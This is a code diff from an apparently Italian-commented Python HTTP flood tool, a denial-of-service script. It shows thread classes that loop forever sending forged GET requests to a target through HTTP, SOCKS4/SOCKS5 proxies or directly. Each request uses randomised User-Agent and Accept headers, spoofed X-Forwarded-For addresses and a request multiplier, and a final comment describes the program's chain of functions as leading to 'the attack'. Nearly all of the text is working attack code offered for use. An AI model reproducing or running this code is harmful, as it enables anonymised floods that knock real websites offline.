+		accept = random.choice(acceptall) # scelta header accept a caso
+		randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
+		forward = "X-Forwarded-For: " + randomip + "\r\n" # X-Forwarded-For, un header HTTP che permette di incrementare anonimato (vedi google per info)
+		request = get_host + useragent + accept + forward + connection + "\r\n" # ecco la final request
+		current = x # per dare l'id al thread
+		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
+			proxy = proxies[current].strip().split(':')
+		else: # altrimenti lo prende a random
+			proxy = random.choice(proxies).strip().split(":")
+		go.wait() # aspetta che i threads siano pronti
+		while True: # ciclo infinito
+			try:
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # ecco il nostro socket
+				s.connect((str(proxy[0]), int(proxy[1]))) # connessione al proxy
+				s.send(str.encode(request)) # encode in bytes della richiesta HTTP
+				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print delle richieste
+				try: # invia altre richieste nello stesso thread
+					for y in range(multiple): # fattore di moltiplicazione
+						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
+				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+					s.close()
+			except:
+				s.close() # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+
+class RequestSocksHTTP(threading.Thread): # la classe del multithreading
+
+	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+		threading.Thread.__init__(self)
+		self.counter = counter
+
+	def run(self): # la funzione che da' le istruzioni ai vari threads
+		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # scelta proxy a caso
+		accept = random.choice(acceptall) # scelta accept a caso
+		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
+		current = x # per dare l'id al thread
+		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
+			proxy = proxies[current].strip().split(':')
+		else: # altrimenti lo prende a random
+			proxy = random.choice(proxies).strip().split(":")
+		go.wait() # aspetta che threads siano pronti
+		while True:
+			try:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per proxarci con i socks
+				s = socks.socksocket() # creazione socket con pysocks
+				s.connect((str(url2), int(urlport))) # connessione
+				s.send (str.encode(request)) # invio
+				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
+				try: # invia altre richieste nello stesso thread
+					for y in range(multiple): # fattore di moltiplicazione
+						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
+				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+					s.close()
+			except: # se qualcosa va storto questo except chiude il socket e si collega al try sotto
+				s.close() # chiude socket
+				try: # il try prova a vedere se l'errore e' causato dalla tipologia di socks errata, infatti prova con SOCKS4
+					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # prova con SOCKS4
+					s = socks.socksocket() # creazione nuovo socket
+					s.connect((str(url2), int(urlport))) # connessione
+					s.send (str.encode(request)) # invio
+					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
+					try: # invia altre richieste nello stesso thread
+						for y in range(multiple): # fattore di moltiplicazione
+							s.send(str.encode(request)) # encode in bytes della richiesta HTTP
+					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+						s.close()
+				except:
+					print ("Sock down. Retrying request. @", self.counter)
+					s.close() # se nemmeno con quel try si e' riuscito a inviare niente, allora il sock e' down e chiude il socket.
+
+class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
+
+	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+		threading.Thread.__init__(self)
+		self.counter = counter
+
+	def run(self): # la funzione che da' le istruzioni ai vari threads
+		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # useragent a caso
+		accept = random.choice(acceptall) # accept a caso
+		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
+		go.wait() # aspetta che i threads siano pronti
+		while True:
+			try:
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
+				s.connect((str(url2), int(urlport))) # connessione
+				s.send (str.encode(request)) # invio
+				print ("Request sent! @", self.counter) # print req + counter
+				try: # invia altre richieste nello stesso thread
+					for y in range(multiple): # fattore di moltiplicazione
+						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
+				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+					s.close()
+			except: # se qualcosa va storto
+				s.close() # chiude socket e ricomincia
 
 
 if __name__ == '__main__':
-
-	while True:
-		choice = input("\nDo you want to download proxies? [Y/n] > ")
-		if choice == 'Y' or choice == 'y' or choice == 'yes' or choice == 'Yes' or choice == '': # se si vuole scaricare i proxy va in main()
-			main()
-			break
-		if choice == 'N' or choice == 'n' or choice == 'no' or choice == 'No': # altrimenti checka solo i proxy
-			proxycheckerinit()
-			break
-		else: # se scrivi male richiede l'input
-			print ("Please write correctly.")
+	starturl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco.
